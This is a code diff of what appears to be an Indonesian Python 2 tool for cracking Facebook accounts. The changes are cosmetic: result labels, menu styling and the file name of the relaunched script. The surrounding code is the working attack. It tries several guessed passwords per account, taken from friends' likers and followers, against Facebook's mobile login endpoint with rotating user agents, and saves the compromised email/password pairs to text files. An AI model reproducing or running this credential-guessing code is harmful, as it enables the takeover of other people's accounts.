-	os.system("python2 crack-2.py")
+	os.system("python2 PRO_V21.py")
 	
 ### CRACK LIKE ###
 def crack_like():
@@ -1051,16 +1051,16 @@ def crack_like():
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc
+				print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc
 				oke = open('done/like.txt', 'a')
-				oke.write('\n[Berhasil] '+em+' ∆ '+pc)
+				oke.write('\n[Angga_Ok] '+em+' ∆ '+pc)
 				oke.close()
 				oks.append(em)
 			else :
 				if 'checkpoint' in xo:
-					print '\033[0;91m[Cekpoint]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc
+					print '\033[0;91m[Angga_Cp]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc
 					cek = open('done/like.txt', 'a')
-					cek.write('\n[Cekpoint] '+em+' ∆ '+pc)
+					cek.write('\n[Angga_Cp] '+em+' ∆ '+pc)
 					cek.close()
 					cekpoint.append(em)
 				else:
@@ -1068,16 +1068,16 @@ def crack_like():
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
-						print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc2
+						print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc2
 						oke = open('done/like.txt', 'a')
-						oke.write('\n[Berhasil] '+em+' ∆ '+pc2)
+						oke.write('\n[Angga_Ok] '+em+' ∆ '+pc2)
 						oke.close()
 						oks.append(em)
 					else:
 						if 'checkpoint' in xo:
-							print '\033[0;91m[Cekpoint]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc2
+							print '\033[0;91m[Angga_Cp]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc2
 							cek = open('done/like.txt', 'a')
-							cek.write('\n[Cekpoint] '+em+' ∆ '+pc2)
+							cek.write('\n[Angga_Cp] '+em+' ∆ '+pc2)
 							cek.close()
 							cekpoint.append(em)
 						else:
@@ -1085,16 +1085,16 @@ def crack_like():
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
-								print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc3
+								print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc3
 								oke = open('done/like.txt', 'a')
-								oke.write('\n[Berhasil] '+em+' ∆ '+pc3)
+								oke.write('\n[Angga_Ok] '+em+' ∆ '+pc3)
 								oke.close()
 								oks.append(em)
 							else:
 								if 'checkpoint' in xo:
-									print '\033[0;91m[Cekpoint]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc3
+									print '\033[0;91m[Angga_Cp]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc3
 									cek = open('done/like.txt', 'a')
-									cek.write('\n[Cekpoint] '+em+' ∆ '+pc3)
+									cek.write('\n[Angga_Cp] '+em+' ∆ '+pc3)
 									cek.close()
 									cekpoint.append(em)
 								else:
@@ -1102,16 +1102,16 @@ def crack_like():
 									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
 									xo = rex.content
 									if 'mbasic_logout_button' in xo or 'save-device' in xo:
-										print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc4
+										print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pc4
 										oke = open('done/like.txt', 'a')
-										oke.write('\n[Berhasil] '+em+' ∆ '+pc4)
+										oke.write('\n[Angga_Ok] '+em+' ∆ '+pc4)
 										oke.close()
 										oks.append(em)
 									else:
 										if 'checkpoint' in xo:
-											print '\033[0;91m[Cekpoint]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc4
+											print '\033[0;91m[Angga_Cp]\033[0;97m '+em+' \033[0;91m∆\033[0;97m '+pc4
 											cek = open('done/like.txt', 'a')
-											cek.write('\n[Cekpoint] '+em+' ∆ '+pc4)
+											cek.write('\n[Angga_Cp] '+em+' ∆ '+pc4)
 											cek.close()
 											cekpoint.append(em)
 		except:
@@ -1124,7 +1124,7 @@ def crack_like():
 	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;91mCP \033[0;91mfile tersimpan \033[0;91m: \033[0;92mdone/like.txt'
 	print 50* "\033[0;93m─"
 	raw_input("\033[0;97m< \033[0;91mKembali\033[0;97m >")
-	os.system("python2 crack-2.py")
+	os.system("python2 PRO_V21.py")
 	
 ##### CRACK FOLLOW #####
 def crack_follow():
@@ -1140,9 +1140,9 @@ def crack_follow():
 	os.system('clear')
 	print logo
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
-	print ('\033[0;93m1.\033[0;97m Crack Dari Follower Saya');time.sleep(0.07)
-	print ('\033[0;93m2.\033[0;97m Crack Dari Follower Teman');time.sleep(0.07)
-	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m1\033[0;95m} \033[0;93mCrack Dari Follower Saya');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m2\033[0;95m} \033[0;93mCrack Dari Follower Teman');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m0\033[0;95m} \033[0;93mKembali');time.sleep(0.07)
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
 	pilih_follow()
 	
@@ -1209,16 +1209,16 @@ def pilih_follow():
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr
+				print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr
 				oke = open('done/follow.txt', 'a')
-				oke.write('\n[Berhasil] '+em+' ∆ '+pr)
+				oke.write('\n[Angga_Ok] '+em+' ∆ '+pr)
 				oke.close()
 				oks.append(em)
 			else :
 				if 'checkpoint' in xo:
-					print '\033[0;93m[Cekpoint]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr
+					print '\033[0;93m[Angga_Cp]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr
 					cek = open('done/follow.txt', 'a')
-					cek.write('\n[Cekpoint] '+em+' ∆ '+pr)
+					cek.write('\n[Angga_Cp] '+em+' ∆ '+pr)
 					cek.close()
 					cekpoint.append(em)
 				else:
@@ -1226,16 +1226,16 @@ def pilih_follow():
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
-						print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr2
+						print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr2
 						oke = open('done/follow.txt', 'a')
-						oke.write('\n[Berhasil] '+em+' ∆ '+pr2)
+						oke.write('\n[Angga_Ok] '+em+' ∆ '+pr2)
 						oke.close()
 						oks.append(em)
 					else:
 						if 'checkpoint' in xo:
-							print '\033[0;93m[Cekpoint]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr2
+							print '\033[0;93m[Angga_Cp]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr2
 							cek = open('done/follow.txt', 'a')
-							cek.write('\n[Cekpoint] '+em+' ∆ '+pr2)
+							cek.write('\n[Angga_Cp] '+em+' ∆ '+pr2)
 							cek.close()
 							cekpoint.append(em)
 						else:
@@ -1243,16 +1243,16 @@ def pilih_follow():
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
-								print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr3
+								print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr3
 								oke = open('done/follow.txt', 'a')
-								oke.write('\n[Berhasil] '+em+' ∆ '+pr3)
+								oke.write('\n[Angga_Ok] '+em+' ∆ '+pr3)
 								oke.close()
 								oks.append(em)
 							else:
 								if 'checkpoint' in xo:
-									print '\033[0;93m[Cekpoint]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr3
+									print '\033[0;93m[Angga_Cp]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr3
 									cek = open('done/follow.txt', 'a')
-									cek.write('\n[Cekpoint] '+em+' ∆ '+pr3)
+									cek.write('\n[Angga_Cp] '+em+' ∆ '+pr3)
 									cek.close()
 									cekpoint.append(em)
 								else:
@@ -1260,16 +1260,16 @@ def pilih_follow():
 									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
 									xo = rex.content
 									if 'mbasic_logout_button' in xo or 'save-device' in xo:
-										print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr4
+										print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pr4
 										oke = open('done/follow.txt', 'a')
-										oke.write('\n[Berhasil] '+em+' ∆ '+pr4)
+										oke.write('\n[Angga_Ok] '+em+' ∆ '+pr4)
 										oke.close()
 										oks.append(em)
 									else:
 										if 'checkpoint' in xo:
-											print '\033[0;93m[Cekpoint]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr4
+											print '\033[0;93m[Angga_Cp]\033[0;97m '+em+' \033[0;93m∆\033[0;97m '+pr4
 											cek = open('done/follow.txt', 'a')
-											cek.write('\n[Cekpoint] '+em+' ∆ '+pr4)
+											cek.write('\n[Angga_Cp] '+em+' ∆ '+pr4)
 											cek.close()
 											cekpoint.append(em)
 		except:
@@ -1282,7 +1282,7 @@ def pilih_follow():
 	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;93mCP \033[0;93mfile tersimpan \033[0;91m: \033[0;92mdone/follow.txt'
 	print 50* "\033[0;93m─"
 	raw_input("\033[0;97m< \033[0;93mKembali\033[0;97m >")
-	os.system("python2 crack-2.py")
+	os.system("python2 PRO_V21.py")
 	
 #### CARI ID ####
 def cari_id():
@@ -1304,13 +1304,13 @@ def hasil_crack():
 	os.system('clear')
 	print logo
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
-	print ('\033[0;92m1. \033[0;97mLihat Hasil Crack Indonesia');time.sleep(0.07)
-	print ('\033[0;92m2. \033[0;97mLihat Hasil Crack Bangladesh');time.sleep(0.07)
-	print ('\033[0;92m3. \033[0;97mLihat Hasil Crack Pakistan');time.sleep(0.07)
-	print ('\033[0;92m4. \033[0;97mLihat Hasil Crack Usa');time.sleep(0.07)
-	print ('\033[0;92m5. \033[0;97mLihat Hasil Crack Like');time.sleep(0.07)
-	print ('\033[0;92m6. \033[0;97mLihat Hasil Crack Follow');time.sleep(0.07)
-	print ('\033[0;91m0. \033[0;97mKembali');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m1\033[0;95m} \033[0;93mLihat Hasil Crack Indonesia');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m2\033[0;95m} \033[0;93mLihat Hasil Crack Bangladesh');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m3\033[0;95m} \033[0;93mLihat Hasil Crack Pakistan');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m4\033[0;95m} \033[0;93mLihat Hasil Crack Usa');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m5\033[0;95m} \033[0;93mLihat Hasil Crack Like');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m6\033[0;95m} \033[0;93mLihat Hasil Crack Follow');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m0\033[0;95m} \033[0;93mmKembali');time.sleep(0.07)
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
 	pilih_hasil()
 	
@@ -1354,7 +1354,7 @@ def perbarui():
 	jalan ("\033[0;92mMemperbarui Script ...\033[0;93m")
 	os.system("git pull origin master")
 	raw_input("\n\033[0;97m<\033[0;92m Kembali \033[0;97m>")
-	os.system("python2 crack-2.py")
+	os.system("python2 PRO_V21.py")
 
 if __name__=='__main__':
 	menu()
